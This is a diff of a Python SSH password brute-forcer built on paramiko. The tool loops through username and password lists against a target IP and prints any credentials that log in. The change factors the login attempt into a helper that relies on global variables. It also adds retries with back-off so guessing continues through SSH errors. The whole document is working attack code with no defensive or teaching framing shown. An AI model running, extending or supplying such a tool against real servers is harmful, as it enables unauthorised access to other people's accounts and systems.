@@ -1,33 +1,38 @@
 import paramiko
-import socket
 import time
 import Util
 import sys
 from optparse import OptionParser
+
+def connection(ssh):
+    try:
+        ssh.connect(server, port, username, password)
+        print("\n[-] Connected successfully. Username = " + username + " and Password = " + password)
+    except paramiko.AuthenticationException as error:
+        pass
+    except paramiko.SSHException as error:
+        return -1
+    except Exception as error:
+        print("\nUnknown error: {} processing {} and password {} " .format(error, username, password))
+        pass
+
+    return 1
+
 
 def attempt(server, port, username, password):
     try:
         ssh = paramiko.SSHClient()
         ssh.load_system_host_keys()
         ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
-
-        try:
-            ssh.connect(server, port, username, password)
-            print("[-] Connected successfully. Username = " + username + " and Password = " + password)
-        except paramiko.AuthenticationException as error:
-            pass
-        except socket.error as error:
-            pass
-        except paramiko.SSHException as error:
-            time.sleep(30)
-            return
-        except Exception as error:
-            print("Unknown error: " + error)
-            pass
+        r = connection(ssh)
         ssh.close()
 
     except Exception as error:
-        print(error)
+        print("\n {}".format(error))
+        return 1
+
+    return r
+
 
 def main():
     usage = '{} [-i targetIp] [-U usernamesFile] [-P passwordsFile]'.format(sys.argv[0])
@@ -65,9 +70,24 @@ if __name__ == "__main__":
         for password in passwords:
             i = i + 1
             print("\r[*] Iterations {}".format(i), end="")
+            ret = -1
             try:
-                attempt(server, port, username, password)
-                time.sleep(1)
+                retry = 0
+                while ret == -1:
+                    ret = attempt(server, port, username, password)
+                    if ret == -1:
+                        retry = retry + 1
+                        if retry == 1:
+                            print("\n[***] Error processing {} pwd {} . "
+                                  "Retrying {} time(s)".format(username, password, retry), end="")
+                        else:
+                            print("\r[***] Error processing {} pwd {} . "
+                                  "Retrying {} time(s)".format(username, password, retry), end="")
+                        time.sleep(5 * retry)
+                    else:
+                        time.sleep(1)
+                if retry > 0:
+                    print("")
             except:
                 print('\nError')
 
